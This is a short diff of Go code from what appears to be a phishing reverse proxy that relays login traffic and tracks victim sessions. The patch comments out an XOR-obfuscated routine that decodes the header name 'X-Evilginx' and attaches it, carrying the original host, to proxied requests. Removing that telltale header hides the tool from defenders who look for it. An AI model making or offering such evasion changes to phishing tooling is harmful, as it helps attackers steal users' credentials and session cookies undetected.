@@ -246,7 +246,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				p.deleteRequestCookie(p.cookieName, req)
 
 				// replace "Host" header
-				e_host := req.Host
+				//e_host := req.Host
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
 				}
@@ -426,11 +426,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
-				e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
-				for n, b := range e {
-					e[n] = b ^ 0x88
-				}
-				req.Header.Set(string(e), e_host)
+				//e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
+				//for n, b := range e {
+				//	e[n] = b ^ 0x88
+				//}
+				//req.Header.Set(string(e), e_host)
 
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 					s, ok := p.sessions[ps.SessionId]
